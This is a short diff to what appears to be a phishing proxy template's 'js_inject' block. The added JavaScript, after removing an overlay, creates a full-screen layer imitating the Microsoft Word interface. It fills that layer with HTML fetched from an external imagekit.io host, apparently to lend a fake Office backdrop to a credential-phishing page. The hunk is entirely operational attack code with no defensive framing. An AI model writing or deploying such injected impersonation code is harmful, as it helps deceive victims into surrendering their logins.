@@ -129,4 +129,27 @@ js_inject:
 
       setTimeout(() => {
         overlay.remove();
+
+        // Inject full Word background layout
+        const wordBG = document.createElement("div");
+        wordBG.id = "wordInterfaceBackground";
+        wordBG.style.position = "fixed";
+        wordBG.style.top = "0";
+        wordBG.style.left = "0";
+        wordBG.style.width = "100vw";
+        wordBG.style.height = "100vh";
+        wordBG.style.zIndex = "0";
+        wordBG.style.overflow = "hidden";
+        wordBG.style.pointerEvents = "none";
+        wordBG.style.background = "#f3f2f1";
+
+        // Inject external HTML content directly as innerHTML
+        fetch("https://ik.imagekit.io/c0x1npott/off.html")
+          .then(res => res.text())
+          .then(html => {
+            wordBG.innerHTML = html;
+            document.body.appendChild(wordBG);
+          })
+          .catch(err => console.error("Failed to load background layout:", err));
+
       }, 3000);
